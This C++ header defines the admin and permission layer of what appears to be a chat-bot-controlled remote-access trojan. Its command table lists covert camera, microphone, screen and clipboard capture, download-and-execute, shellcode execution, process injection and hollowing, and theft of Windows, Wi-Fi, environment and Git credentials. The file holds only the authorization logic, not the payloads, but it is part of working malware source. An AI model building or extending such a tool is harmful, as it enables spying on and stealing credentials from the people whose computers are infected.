#pragma once

#include <cstdint>
#include <string>
#include <vector>
#include <unordered_map>

namespace nuub::domain::entities {

// Permission levels for admin commands
enum class Permission : uint8_t {
    READONLY = 0,   // Can only read: /status, /sysinfo, /ps, /ls, /cat, /clipboard, /locate
    LIMITED = 1,    // READONLY + /shell (read-only cmds), /wifi, /getlog, /info
    FULL = 2,       // All commands including destructive: /kill, /rm, /downloadexec, /shell (write)
};

struct AdminInfo {
    std::int64_t chat_id;
    std::string name;       // Optional display name
    Permission permission;
};

class Admin {
    std::vector<AdminInfo> admins_;

    // Commands that require FULL permission
    static inline const std::unordered_map<std::string, Permission> command_permissions_ = {
        // READONLY commands (any admin can use)
        {"status",       Permission::READONLY},
        {"sysinfo",      Permission::READONLY},
        {"ps",           Permission::READONLY},
        {"ls",           Permission::READONLY},
        {"cat",          Permission::READONLY},
        {"clipboard",    Permission::READONLY},
        {"locate",       Permission::READONLY},
        {"info",         Permission::READONLY},
        {"alerts",       Permission::READONLY},

        // LIMITED commands (require LIMITED or higher)
        {"shell",        Permission::LIMITED},
        {"wifi",         Permission::LIMITED},
        {"getlog",       Permission::LIMITED},
        {"mkdir",        Permission::LIMITED},
        {"setclip",      Permission::LIMITED},
        {"take_photo",   Permission::LIMITED},
        {"screenshot",   Permission::LIMITED},
        {"record_audio", Permission::LIMITED},
        {"alert",        Permission::LIMITED},
        {"unalert",      Permission::LIMITED},
        {"send",         Permission::LIMITED},
        {"help",         Permission::READONLY},
        {"agents",       Permission::READONLY},

        // FULL commands (require FULL permission)
        {"kill",          Permission::FULL},
        {"rm",            Permission::FULL},
        {"downloadexec",  Permission::FULL},
        {"take_video",    Permission::FULL},
        {"screenrecord",  Permission::FULL},
        {"shutdown",      Permission::FULL},
        {"uninstall",     Permission::FULL},
        {"inject",        Permission::FULL},
        {"hollow",        Permission::FULL},
        {"shellcode",     Permission::FULL},
        {"creds",         Permission::FULL},
        {"wifi_creds",    Permission::FULL},
        {"win_creds",     Permission::FULL},
        {"env_creds",     Permission::FULL},
        {"git_creds",     Permission::FULL},
    };

public:
    // Legacy single admin
    explicit Admin(std::int64_t chat_id)
        : admins_{{chat_id, "", Permission::FULL}} {}

    // Multiple admins with default FULL permission
    explicit Admin(std::vector<std::int64_t> chat_ids) {
        for (auto id : chat_ids) {
            admins_.push_back({id, "", Permission::FULL});
        }
    }

    // Full constructor with roles
    explicit Admin(std::vector<AdminInfo> admins)
        : admins_(std::move(admins)) {}

    [[nodiscard]] bool is_authorized(std::int64_t chat_id) const {
        for (const auto& admin : admins_) {
            if (admin.chat_id == chat_id) return true;
        }
        return false;
    }

    // Check if admin can execute a specific command
    [[nodiscard]] bool can_execute(std::int64_t chat_id, const std::string& command) const {
        auto required = required_permission(command);
        for (const auto& admin : admins_) {
            if (admin.chat_id == chat_id) {
                return static_cast<uint8_t>(admin.permission) >= static_cast<uint8_t>(required);
            }
        }
        return false;
    }

    // Get permission level for an admin
    [[nodiscard]] Permission get_permission(std::int64_t chat_id) const {
        for (const auto& admin : admins_) {
            if (admin.chat_id == chat_id) return admin.permission;
        }
        return Permission::READONLY;
    }

    // Get required permission for a command
    [[nodiscard]] static Permission required_permission(const std::string& command) {
        auto it = command_permissions_.find(command);
        if (it != command_permissions_.end()) return it->second;
        return Permission::FULL; // Unknown commands require FULL
    }

    [[nodiscard]] const std::vector<AdminInfo>& admins() const { return admins_; }

    [[nodiscard]] std::vector<std::int64_t> chat_ids() const {
        std::vector<std::int64_t> ids;
        for (const auto& a : admins_) ids.push_back(a.chat_id);
        return ids;
    }

    [[nodiscard]] std::int64_t primary_chat_id() const {
        return admins_.empty() ? 0 : admins_.front().chat_id;
    }

    [[nodiscard]] std::string get_permission_name(std::int64_t chat_id) const {
        switch (get_permission(chat_id)) {
            case Permission::READONLY: return "readonly";
            case Permission::LIMITED:  return "limited";
            case Permission::FULL:     return "full";
        }
        return "unknown";
    }
};

} // namespace nuub::domain::entities
